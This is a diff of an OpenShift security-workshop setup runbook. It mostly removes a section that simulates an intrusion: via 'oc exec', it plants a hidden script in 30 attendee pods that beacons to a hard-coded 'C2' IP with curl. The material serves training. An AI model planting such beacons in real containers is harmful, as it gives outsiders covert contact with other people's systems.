@@ -22,7 +22,7 @@ WARNING: Using insecure TLS client config. Setting this option is not supported!
 
 Login successful.
 
-You have access to 98 projects, the list has been suppressed. You can list all projects with 'oc projects'
+You have access to 77 projects, the list has been suppressed. You can list all projects with 'oc projects'
 
 Using project "default".
 #+end_example
@@ -62,7 +62,6 @@ EOF
 
 #+RESULTS: Update cluster logo
 #+begin_example
-configmap/console-custom-logo created
 console.operator.openshift.io/cluster configured
 #+end_example
 
@@ -119,498 +118,7 @@ EOF
 
 #+RESULTS: Create node log view cluster role
 #+begin_example
-clusterrole.rbac.authorization.k8s.io/node-log-viewer configured
-#+end_example
-
-
-* Deploy exercise 2 & 3 compromised workloads
-
-For the purposes of exercise 2 we need an existing project and demo workload for each workshop user.
-
-We'll create the required ~Project~, ~Pod~ and ~ServiceAccount~ by hydrating an OpenShift ~Template~, then carry out the exploit with a bash script once the pods are up.
-
-The ~setup/app-template.yaml~ file also handles the various permissions each workshop attendee requires.
-
-#+NAME: Deploy compromised workloads
-#+begin_src bash
-echo "Applying template for each attendee"
-for i in $(seq 1 30); do
-
-  # Clean up any pre-existing exploited pod
-  oc delete pod -l app=payment-gateway --namespace="payment-gateway-${i}" --grace-period=0 --force 2>/dev/null || true
-  oc wait --for=delete pod -l app=payment-gateway --namespace="payment-gateway-${i}" --timeout=30s 2>/dev/null || true
-
-  # Hydrate the new pod and supporting resources
-  oc process --filename setup/app-template.yaml --param SUFFIX=$i | oc apply --filename -
-done
-
-echo "Waiting for all payment-gateway pods to initialize..."
-oc wait --for=condition=Ready pods --selector app=payment-gateway --all-namespaces --timeout=90s
-
-echo "Simulating live 'oc exec' intrusion across environments..."
-for i in $(seq 1 30); do
-  namespace="payment-gateway-$i"
-
-  # Request a short lived token for our new cicd service account in this namespace
-  token=$(oc create token cicd-pipeline-runner-sa --namespace "${namespace}")
-
-  # Executing the exploit payload dynamically using explicit parameter names
-  oc exec pod/payment-gateway \
-    --namespace "${namespace}" \
-    --token "${token}" \
-    --container httpd \
-    -- sh -c '
-      export C2_SERVER="185.199.108.153"
-      export CODENAME="SHADOW_PIVOT"
-      export ENV_MARKER="ACME_SECRET_KEY_EXFIL_TEST_9921"
-
-      mkdir -p /tmp/.hidden_toolkit
-
-      # Build a script that actively beacons out to the C2 server every 10 seconds
-      cat << "EOF" > /tmp/.hidden_toolkit/exfil.sh
-#!/bin/sh
-while true; do
-  curl --silent --max-time 2 --output /dev/null \
-    --header "X-Agent-ID: SHADOW_PIVOT" \
-    --header "X-Target-Namespace: payment-gateway" \
-    "http://185.199.108.153/api/v1/beacon"
-
-  sleep 30
-done
-EOF
-
-      chmod +x /tmp/.hidden_toolkit/exfil.sh
-      /tmp/.hidden_toolkit/exfil.sh > /dev/null 2>&1 &
-    '
-  echo "[+] Namespace ${namespace} weaponized via simulated session execution."
-done
-#+end_src
-
-#+RESULTS: Deploy compromised workloads
-#+begin_example
-Applying template for each attendee
-pod "payment-gateway" force deleted from payment-gateway-1 namespace
-project.project.openshift.io/payment-gateway-1 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-1 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-1 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-2 namespace
-project.project.openshift.io/payment-gateway-2 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-2 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-2 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-3 namespace
-project.project.openshift.io/payment-gateway-3 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-3 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-3 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-4 namespace
-project.project.openshift.io/payment-gateway-4 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-4 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-4 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-5 namespace
-project.project.openshift.io/payment-gateway-5 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-5 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-5 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-6 namespace
-project.project.openshift.io/payment-gateway-6 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-6 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-6 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-7 namespace
-project.project.openshift.io/payment-gateway-7 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-7 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-7 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-8 namespace
-project.project.openshift.io/payment-gateway-8 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-8 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-8 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-9 namespace
-project.project.openshift.io/payment-gateway-9 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-9 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-9 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-10 namespace
-project.project.openshift.io/payment-gateway-10 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-10 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-10 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-11 namespace
-project.project.openshift.io/payment-gateway-11 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-11 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-11 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-12 namespace
-project.project.openshift.io/payment-gateway-12 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-12 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-12 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-13 namespace
-project.project.openshift.io/payment-gateway-13 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-13 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-13 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-14 namespace
-project.project.openshift.io/payment-gateway-14 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-14 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-14 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-15 namespace
-project.project.openshift.io/payment-gateway-15 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-15 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-15 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-16 namespace
-project.project.openshift.io/payment-gateway-16 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-16 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-16 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-17 namespace
-project.project.openshift.io/payment-gateway-17 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-17 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-17 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-18 namespace
-project.project.openshift.io/payment-gateway-18 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-18 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-18 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-19 namespace
-project.project.openshift.io/payment-gateway-19 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-19 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-19 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-20 namespace
-project.project.openshift.io/payment-gateway-20 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-20 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-20 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-21 namespace
-project.project.openshift.io/payment-gateway-21 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-21 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-21 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-22 namespace
-project.project.openshift.io/payment-gateway-22 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-22 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-22 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-23 namespace
-project.project.openshift.io/payment-gateway-23 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-23 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-23 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-24 namespace
-project.project.openshift.io/payment-gateway-24 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-24 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-24 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-25 namespace
-project.project.openshift.io/payment-gateway-25 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-25 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-25 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-26 namespace
-project.project.openshift.io/payment-gateway-26 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-26 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-26 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-27 namespace
-project.project.openshift.io/payment-gateway-27 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-27 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-27 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-28 namespace
-project.project.openshift.io/payment-gateway-28 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-28 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-28 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-29 namespace
-project.project.openshift.io/payment-gateway-29 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-29 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-29 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-pod "payment-gateway" force deleted from payment-gateway-30 namespace
-project.project.openshift.io/payment-gateway-30 unchanged
-pod/payment-gateway created
-serviceaccount/cicd-pipeline-runner-sa unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-edit-binding unchanged
-role.rbac.authorization.k8s.io/container-executor unchanged
-rolebinding.rbac.authorization.k8s.io/workshop-sa-exec-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-admin-binding unchanged
-clusterrolebinding.rbac.authorization.k8s.io/node-logs-binding-30 unchanged
-clusterrolebinding.rbac.authorization.k8s.io/must-gather-sa-metadata-binding-30 unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-privileged-scc-binding unchanged
-rolebinding.rbac.authorization.k8s.io/attendee-vulnerable-admin-binding unchanged
-Waiting for all payment-gateway pods to initialize...
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-pod/payment-gateway condition met
-Simulating live 'oc exec' intrusion across environments...
-[+] Namespace payment-gateway-1 weaponized via simulated session execution.
-[+] Namespace payment-gateway-2 weaponized via simulated session execution.
-[+] Namespace payment-gateway-3 weaponized via simulated session execution.
-[+] Namespace payment-gateway-4 weaponized via simulated session execution.
-[+] Namespace payment-gateway-5 weaponized via simulated session execution.
-[+] Namespace payment-gateway-6 weaponized via simulated session execution.
-[+] Namespace payment-gateway-7 weaponized via simulated session execution.
-[+] Namespace payment-gateway-8 weaponized via simulated session execution.
-[+] Namespace payment-gateway-9 weaponized via simulated session execution.
-[+] Namespace payment-gateway-10 weaponized via simulated session execution.
-[+] Namespace payment-gateway-11 weaponized via simulated session execution.
-[+] Namespace payment-gateway-12 weaponized via simulated session execution.
-[+] Namespace payment-gateway-13 weaponized via simulated session execution.
-[+] Namespace payment-gateway-14 weaponized via simulated session execution.
-[+] Namespace payment-gateway-15 weaponized via simulated session execution.
-[+] Namespace payment-gateway-16 weaponized via simulated session execution.
-[+] Namespace payment-gateway-17 weaponized via simulated session execution.
-[+] Namespace payment-gateway-18 weaponized via simulated session execution.
-[+] Namespace payment-gateway-19 weaponized via simulated session execution.
-[+] Namespace payment-gateway-20 weaponized via simulated session execution.
-[+] Namespace payment-gateway-21 weaponized via simulated session execution.
-[+] Namespace payment-gateway-22 weaponized via simulated session execution.
-[+] Namespace payment-gateway-23 weaponized via simulated session execution.
-[+] Namespace payment-gateway-24 weaponized via simulated session execution.
-[+] Namespace payment-gateway-25 weaponized via simulated session execution.
-[+] Namespace payment-gateway-26 weaponized via simulated session execution.
-[+] Namespace payment-gateway-27 weaponized via simulated session execution.
-[+] Namespace payment-gateway-28 weaponized via simulated session execution.
-[+] Namespace payment-gateway-29 weaponized via simulated session execution.
-[+] Namespace payment-gateway-30 weaponized via simulated session execution.
+clusterrole.rbac.authorization.k8s.io/node-log-viewer created
 #+end_example
 
 
@@ -637,51 +145,51 @@ done
 #+RESULTS: Deploy vulnerable workloads
 #+begin_example
 Applying template for each attendee
-namespace/vulnerable-workload-1 unchanged
-deployment.apps/message-broker unchanged
-service/message-broker unchanged
-deployment.apps/edge-server unchanged
-service/edge-server unchanged
-deployment.apps/socketio-server configured
-service/socketio-server unchanged
-route.route.openshift.io/edge-server unchanged
-route.route.openshift.io/socketio-server unchanged
-namespace/vulnerable-workload-2 unchanged
-deployment.apps/message-broker unchanged
-service/message-broker unchanged
